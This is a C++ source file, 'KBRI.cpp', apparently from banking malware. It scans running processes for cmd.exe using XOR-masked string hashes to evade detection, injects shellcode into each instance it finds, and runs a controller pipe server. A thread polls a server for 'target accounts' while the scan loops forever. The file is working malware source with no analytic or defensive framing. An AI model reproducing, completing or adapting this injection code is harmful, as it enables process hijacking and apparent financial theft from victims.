/*
	KBRI.cpp
	Main routines file
*/

#include <Windows.h>
#include <TlHelp32.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"
#include "..\inc\HashedStrings.h"
#include "..\inc\MyStringRoutines.h"

#include "..\inc\EmbeddedResources.h"
#include "..\Shellcode\shellcode.h"

#include "kbriInject.h"
#include "kbriList.h"
#include "kbriController.h"
#include "kbriTargetAccManager.h"
#include "kbriDataParser.h"

#include "KBRI.h"



// module's globals
KBRI_GLOBALS gKBRI;



/*
	enums all running processes to find cmd.exe and attempt to call injection function for it
*/
#define KBRIA_RND_XOR STRHASH_PARAM(0x2e555d24997b6c7)
VOID kbriScanInjectCmdProcess()
{
	HANDLE hSnap = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe = { 0 };

	//DbgPrint("entered");

	do {	// not a loop

		// before scan, set a special flag in all saved items to remove non-existent processes later
		kbriClearScannedFlag(&gKBRI.list);

		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap == INVALID_HANDLE_VALUE) { DbgPrint("ERR: CreateToolhelp32Snapshot() failed, code %p", GetLastError()); break; }

		pe.dwSize = sizeof(PROCESSENTRY32);
		if (!Process32First(hSnap, &pe)) { DbgPrint("ERR: Process32First() failed, le %p", GetLastError()); break; }

		do {

			// process pe structure
			sr_lowercase(pe.szExeFile);
			if ((HashStringW_const(pe.szExeFile) ^ KBRIA_RND_XOR) == (HASHSTR_CONST("cmd.exe", 0x3eaf098d3e434b1a) ^ KBRIA_RND_XOR)) {

				// add while checking if such pid not exist yet
				// ALSO, adds scanned flag in case of duplicate pid
				if (kbriAddInjectedPid(&gKBRI.list, pe.th32ProcessID)) {

					DbgPrint("detected cmd process pid %u", pe.th32ProcessID);

					kbriAttemptInject(pe.th32ProcessID);

				}	// dup check

			}	// hash check

		} while (Process32Next(hSnap, &pe));

		// all done
		CloseHandle(hSnap);

		// remove from list items, not found during last scan
		kbriRemoveNotScanned(&gKBRI.list);

	} while (FALSE);	// not a loop
}



/*
	Starts a thread to monitor / inject into target processes
	NB: we have max 5 sec after target cmd script start to perform injection before it starts working
*/
VOID kbriStartInjMonitor()
{

	// init globals
	memset(&gKBRI, 0, sizeof(KBRI_GLOBALS));
	kbriInitList(&gKBRI.list);

	kdpInit();
	
	// engage controller pipe server
	kcStartController(&gKBRI);

	// start server communication thread to periodically request t-accs updates
	tamStartTAccsQueryThread(&gKBRI);

	// start scan
	do {

		kbriScanInjectCmdProcess();

#ifndef _DEBUG
		Sleep(15000);
#else
		Sleep(3000);
#endif

	} while (TRUE);	// infinite loop

}